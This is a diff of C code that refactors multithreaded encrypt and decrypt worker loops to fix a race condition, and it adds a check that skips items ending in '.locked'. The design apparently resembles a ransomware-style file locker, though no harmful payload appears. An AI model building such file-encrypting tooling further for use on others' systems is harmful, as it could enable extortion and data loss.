@@ -11,10 +11,17 @@
 
 void start_encrypt() {
     while (true) {
-        char *head = peek(&queue); //race condition maybe peek_and_dequeue.
-        if (head == NULL || strcmp(head, "END_ENCRYPT") == 0) break;
-        
-        char *data = dequeue(&queue);
+
+        char *data = peek_and_dequeue(&queue, "END_ENCRYPT");
+        if (data == NULL){
+            break;
+        }
+                
+        if (strstr(data, ".locked") != NULL) {
+            free(data);
+            continue;
+        }
+
         printf("TID: %lu: \n%s\n", (unsigned long)pthread_self(), data);
         unsigned char key[16];
         use_key(key);
@@ -28,10 +35,12 @@ void start_encrypt() {
 
 void start_decrypt() {
     while (true) {
-        char *head = peek(&queue);
-        if (head == NULL || strcmp(head, "END_DECRYPT") == 0) break;
+        char *data = peek_and_dequeue(&queue, "END_DECRYPT");
 
-        char *data = dequeue(&queue);
+        if (data == NULL){
+            break;
+        }
+
         printf("TID: %lu: \n%s\n", (unsigned long)pthread_self(), data);
         unsigned char key[16];
         use_key(key);
